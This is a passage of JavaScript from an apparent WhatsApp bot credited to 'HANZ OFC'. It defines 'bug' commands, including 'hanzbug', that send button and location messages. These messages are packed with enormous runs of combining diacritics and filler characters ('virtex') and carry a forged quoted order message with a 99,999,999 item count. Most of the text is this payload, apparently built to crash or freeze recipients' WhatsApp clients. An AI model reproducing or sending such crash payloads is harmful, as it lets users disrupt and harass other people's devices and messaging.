ꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈ᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈ꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈ𝟗𝟗𝟗`,}, type: 1}
				    ]
					let buttonMessageh = {
						contentText: `🎩HANZ々OFC彡🎩\n▬▭▬▭▬▭▬▭▬▬▭▬▭▬\nhttps://youtube.com/channel/UCfhWUHl7dskRCVlyDMxnQbw\n▬▭▬▭▬▭▬▭▬▬▭▬▭▬`,
						footerText: virtex7(prefix),
						buttons: buttons,
						headerType: 4,
						...mdia
					}
					Hanz.sendMessage(from, buttonMessageh, MessageType.buttonsMessage, { 
                 quoted: {
                key: {
                participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                },
                message: {
                orderMessage: {
                itemCount: 99999999,
                status: 1
                ,surface: 10,
                orderTitle: 'bugbuttonv', //
                sellerJid: '0@s.whatsapp.net'
                }}}})
					break	
//BUG BUTTON LOKASI									
					case 'hanzbug':
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')					
await Hanz.relayWAMessage(Hanz.prepareMessageFromContent(from, Hanz.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
        sendButtonLocation(from,
        '⏳HANZ々OFC彡⏳\n▬▭▬▭▬▭▬▭▬▬▭▬▭▬\nhttps://youtube.com/channel/UCfhWUHl7dskRCVlyDMxnQbw\n▬▭▬▭▬▭▬▭▬▬▭▬▭▬', 
        `BUGBOT KOK RASA CACING~😎\n${virtex7(prefix)}`, {
        jpegThumbnail:fs.readFileSync(`./media/virgam.jpeg`)},
        [{buttonId:`${prefix}bbaij72njnwjibdo16830nslm1782`,
        buttonText: {displayText: `${virtex2(prefix)}${virtex7(prefix)}${virtex3(prefix)}᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ֻࣰًًًًًࣰࣱࣱࣱٍ᳕ܾࣶࣶ֖֖᷽᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩۡ᪳ࣧࣧ᪳́ࣼ᳚᪳̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًًࣰًًًًً᳕ܾࣶࣶ֖֖᷽᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈ꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈ